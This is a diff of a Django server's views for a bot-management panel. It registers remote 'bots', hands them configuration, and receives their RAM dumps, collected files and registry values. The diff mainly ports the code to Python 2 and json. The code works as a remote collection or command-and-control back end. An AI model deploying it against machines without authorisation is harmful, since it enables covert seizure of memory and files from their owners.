@@ -5,15 +5,15 @@ from django.core.exceptions import ObjectDoesNotExist
 
 from panel.models import Bot, Artifact, Query, Command, Config #, Hunt
 
-import os, urllib, bson, datetime, multiprocessing
+import os, urllib, datetime, multiprocessing, json
 # Create your views here.
 
-FILE_DIRECTORY = os.path.dirname(os.path.abspath(__file__)) + "\\UPLOADS"
-RAMDUMPS = os.path.dirname(os.path.abspath(__file__)) + "\\RAMDUMPS"
+FILE_DIRECTORY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "UPLOADS")
+RAMDUMPS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "RAMDUMPS")
 RAMDUMP_PROCESSES = {}
 
 def receive_ramdump_thread(bot):
-	print("Getting ready to receive RAM dump from %s" % bot)
+	print "Getting ready to receive RAM dump from %s" % bot
 	import socket
 	socket.setdefaulttimeout(60)
 
@@ -30,17 +30,17 @@ def receive_ramdump_thread(bot):
 		s.listen(1)
 		conn, addr = s.accept()
 	except Exception as e:
-		print("ERROR: %s" % e)
+		print "ERROR: %s" % e
 		return
 	except KeyboardInterrupt as e:
-		print("KeyboardInterrupt received, breaking")
+		print "KeyboardInterrupt received, breaking"
 		conn.close()
 		cmd.done = False
 		cmd.data = "Dump interrupted"
 		cmd.save()
 		return
 
-	print('Received connection from', addr)
+	print 'Received connection from', addr
 	cmd = Command.objects.get(target__computer_name=bot, type='ramdump')
 	cmd.done = True
 	cmd.data = "Dump in progres..."
@@ -48,7 +48,7 @@ def receive_ramdump_thread(bot):
 
 	date = datetime.datetime.now()
 	date = "%s_%s%s%s" % (date.date(), date.hour, date.minute, date.second)
-	filename = RAMDUMPS + "\\RAMDUMP-%s-%s.ramdump" % (bot, date)
+	filename = os.path.join(RAMDUMPS, "RAMDUMP-%s-%s.ramdump" % (bot, date))
 
 	ram = open(filename, 'wb+')
 	try:
@@ -60,13 +60,13 @@ def receive_ramdump_thread(bot):
 		ram.close()
 		conn.close()
 	except Exception as e:
-		print("ERROR: %s" % e)
+		print "ERROR: %s" % e
 		cmd.done = False
 		cmd.data = "ERROR: %s" % e
 		cmd.save()
 		return
 	except KeyboardInterrupt as e:
-		print("KeyboardInterrupt received, breaking")
+		print "KeyboardInterrupt received, breaking"
 		ram.close()
 		conn.close()
 		cmd.done = False
@@ -157,7 +157,7 @@ def build_configuration(bot):
 def gate(request):
 
 	if request.method == 'POST':
-		data = bson.loads(request.body)
+		data = request.POST
 		node_id = data['node_id']
 		bot = get_object_or_404(Bot, computer_name=node_id)
 
@@ -173,13 +173,13 @@ def gate(request):
 			raise Http404
 
 		try: # query DB for node, if not present then create it
-			print("Searching node id %s" % node_id)
+			print "Searching node id %s" % node_id
 			bot = Bot.objects.get(computer_name=node_id)
-			print("Bot %s found. Sending configuration file..." % node_id)
+			print "Bot %s found. Sending configuration file..." % node_id
 		except ObjectDoesNotExist as e:
-			print("Bot %s not found. Registering..." % node_id, end = ' ')
+			print "Bot %s not found. Registering..." % node_id
 			bot = register_bot(request.GET.dict())
-			print("Success.")
+			print "Success."
 
 		conf = build_configuration(bot)
 
@@ -194,22 +194,25 @@ def command_results(request):
 	if request.method == 'GET':
 		raise Http404
 
-	command_results = bson.loads(request.body)
-
+	command_results = json.loads(request.body)
+	print command_results
 	for c in command_results:
 		id = c['command_id']
 		done = c['done']
 		data = c['data']
+		print data
 
 		cmd = get_object_or_404(Command, id=id)
 		cmd.done = c['done']
 
 		if cmd.type == 'getfile' or cmd.type == 'getfileenc' and cmd.done == True:
-			filename = cmd.body.split('\\')[-1]
+			print cmd.body
+			filename = cmd.body.replace("\\", '_').replace('/', '_')
+			print filename
 			filename = ("%s-%s.file" % (cmd.target.computer_name, filename))
 			if cmd.type == 'getfileenc': filename += '.encrypted'
-			open(FILE_DIRECTORY + '\\' + filename, 'wb').write(c['data'])
-			cmd.data = "Saved data to %s" % FILE_DIRECTORY + '\\' + filename
+			open(os.path.join(FILE_DIRECTORY, filename), 'wb').write(c['data'])
+			cmd.data = "Saved data to %s" % os.path.join(FILE_DIRECTORY, filename)
 
 		if cmd.type == 'regget' and cmd.done == True:
 			cmd.data = data
